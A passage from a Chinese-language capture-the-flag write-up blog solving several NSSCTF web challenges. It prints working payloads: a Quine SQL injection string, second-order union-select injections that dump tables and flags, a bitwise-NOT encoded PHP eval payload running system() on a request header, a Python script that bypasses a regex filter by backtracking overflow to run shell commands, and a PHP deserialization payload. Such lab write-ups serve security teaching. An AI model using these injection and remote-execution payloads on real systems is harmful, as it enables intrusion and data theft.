class="string">&#x27;passwd&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> == <span class="string">&#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">die</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>考点为sql注入之Quine注入</p><p><strong>这里先介绍一下Quine注入：</strong></p><p><a href="https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html">https://nakaii.top/2023/04/24/%E8%AE%B0%E4%B8%80%E6%AC%A1Quino%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/index.html</a></p><p>Quine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。</p><p>突破口是replace函数</p><blockquote><p>replace(object, search, replace)</p></blockquote><p>此函数用于将object中的所有search替换为replace。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&quot;.&quot;, char(46), &quot;!&quot;);</span><br><span class="line">+-----------------------------+</span><br><span class="line">| replace(&quot;.&quot;, char(46), &quot;!&quot;) |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| !                           |</span><br><span class="line">+-----------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>尝试使输入输出保持一致！</strong></p><p><strong>替换object</strong></p><p>尝试通过替换object使输入输出保持一致:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;.&#x27;) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| replace(&quot;.&quot;,char(46),&quot;.&quot;)                         |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>还是差一点，只是将object中的字符串原样输出了，replace还没怎么用到，是否可以通过更改replace使输入输出保持一致？</p><p><strong>替换object+replace</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;,char(46),&#x27;replace(&quot;.&quot;,char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">| replace(&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;,char(46),&quot;replace(&quot;.&quot;,char(46),&quot;.&quot;)&quot;) |</span><br><span class="line">+---------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p>可以看到确实长得差不多了，但还是有问题，包围object和replace的符号仍然有差异。object中的.被替换为了replace(“.”,char(46),”.”),但包围.的引号为双引号，如果直接更改为单引号会造成最外层replace的object界限不明确，因此还需要再套一层replace，将双引号改为单引号。</p><p><strong>解决引号问题</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(&#x27;&quot;.&quot;&#x27;,char(34),char(39))</span><br></pre></td></tr></table></figure><p>语句将字符串中的双引号替换为了单引号，这就是解决引号问题的方法，即在object外再套一层replace将里面的双引号更改为单引号：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [(none)]&gt; select replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;);</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| replace(replace(&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;,char(34),char(39)),char(46),&#x27;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#x27;) |</span><br><span class="line">+------------------------------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure><p><strong>总结</strong></p><p>Quine基本形式：</p><blockquote><p> replace(replace(‘str’,char(34),char(39)),char(46),‘str’)</p></blockquote><p>先将str里的双引号替换成单引号，再用str替换str里的.</p><p>str基本形式（可以理解成上面的”.”）：</p><blockquote><p> replace(replace(“.”,char(34),char(39)),char(46),”.”)</p></blockquote><p>完整的Quine就是<em><strong>Quine基本形式+str基本形式</strong></em></p><p>这时我们再回头看题目</p><p>str基本形式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#</span><br></pre></td></tr></table></figure><p>quine基本形式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;str&#x27;,char(34),char(39)),char(46),&#x27;str&#x27;)#</span><br></pre></td></tr></table></figure><p>总体为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p>但是此处char被过滤，那么用chr也行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/replace(replace(&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;,chr(34),chr(39)),chr(46),&#x27;&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,chr(34),chr(39)),chr(46),&quot;.&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png" alt="image-20241201162019665"></p><p>NSSCTF{23e578bc-4904-467f-8c73-544bccadb796}</p><h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h2><p>标题直说了，二次注入</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png" alt="image-20241201162431475"></p><p>存在登陆注册界面，可能就是通过注册，将恶意sql存入数据库，登陆时将username代入select语句从而导致了二次注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()#</span><br></pre></td></tr></table></figure><p>以上payload使登陆后页面回显ctftraining</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png" alt="image-20241201162925243" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)#</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png" alt="image-20241201163048605" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select (select group_concat(flag) from flag)#</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;1f52dc37-5280-432e-8935-ed7a31f848a0&#125;</span><br></pre></td></tr></table></figure><h2 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>无字母字母rce和无参rce的结合版</p><p>看过滤，直接用取反就可以</p><p>最终想要构造的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(end(getallheaders()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()));</span><br></pre></td></tr></table></figure><p> 然后用二维数组进行拼接必须有[!%FF进行分割]</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png" alt="image-20241201165516664" style="zoom:67%;" /><p>NSSCTF{8eb0d6fc-55b1-4d5b-90bc-5140b5565b6b}</p><h2 id="NISACTF-2022-middlerce"><a href="#NISACTF-2022-middlerce" class="headerlink" title="[NISACTF 2022]middlerce"></a>[NISACTF 2022]middlerce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$txw4ever</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;letter&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&amp;|!|\&lt;|\&gt;|\&#123;|\x09|\x0a|\[).*$/m&#x27;</span>,<span class="variable">$txw4ever</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;再加把油喔&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$command</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$txw4ever</span>,<span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">checkdata</span>(<span class="variable">$command</span>);</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$command</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>只需绕过preg_match后面就简单了，preg回溯次数绕过，大于1000000字符就可以啦简单</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;eeeee&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png" alt="image-20241201195030922"></p><p>回显不再是再加把油喔，那么就成功了，接下来我们需要绕过的就是checkdata函数！</p><p>eval的话可以短标签+反引号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://node4.anna.nssctf.cn:28728/&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?=`ls /`?&gt;&quot;,&quot;aaa&quot;:&quot;&#x27;</span>+<span class="string">&quot;$&quot;</span>*<span class="number">1000000</span>+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">res=requests.post(url,data=&#123;<span class="string">&quot;letter&quot;</span>:payload&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>根目录发现&#x2F;flag，那么就拿捏了啊</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl /f*</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png" alt="image-20241201195811853"></p><h2 id="CISCN-2023-华北-ez-date"><a href="#CISCN-2023-华北-ez-date" class="headerlink" title="[CISCN 2023 华北]ez_date"></a>[CISCN 2023 华北]ez_date</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;a)||<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;b))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;no array&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;a !== <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;b)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;a)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;b)) )&#123;</span><br><span class="line">            <span class="variable">$content</span>=<span class="title function_ invoke__">date</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="variable">$uuid</span>=<span class="title function_ invoke__">uniqid</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$uuid</span>,<span class="variable">$content</span>);</span><br><span class="line">            <span class="variable">$data</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uuid</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])); </span><br></pre></td></tr></table></figure><p>php反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">date</span>(<span class="string">&quot;/f\l\a\g&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#/flag</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$content=date($this-&gt;file);</span><br><span class="line"></span><br><span class="line">#  $content接受经过被date函数格式化后的变量file</span><br><span class="line">#date()的说明：</span><br><span class="line">#该方法会检测传入的字符串中是否有特定的格式化字符，如Y（年份）、m（月份）、d（天）、H（时）、i（分钟）、s（秒）等</span><br><span class="line">#    检测存在则会将格式化字符替换为当前时间的对应部分，否则将字符进行原样输出，同时可用转义字符将格式化字符原样输出</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/f\l\a\g&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">date</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h2 id="NISACTF-2022-babyupload"><a href="#NISACTF-2022-babyupload" class="headerlink" title="[NISACTF 2022]babyupload"></a>[NISACTF 2022]babyupload</h2><p>打开后出现了一个简单的文件上传界面，查看一下源码，发现hint为&#x2F;source，访问一下获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, g, send_from_directory</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SCHEMA = <span class="string">&quot;&quot;&quot;CREATE TABLE files (</span></span><br><span class="line"><span class="string">id text primary key,</span></span><br><span class="line"><span class="string">path text</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    g_db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> g_db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        g_db = g._database = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> g_db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setup</span>():</span><br><span class="line">    os.remove(<span class="string">&quot;database.db&quot;</span>)</span><br><span class="line">    cur = db().cursor()</span><br><span class="line">    cur.executescript(SCHEMA)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">    Select image to upload:</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;!-- /source --&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(directory=<span class="string">&quot;/var/www/html/&quot;</span>, path=<span class="string">&quot;www.zip&quot;</span>, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Bad filename!&quot;</span>, <span 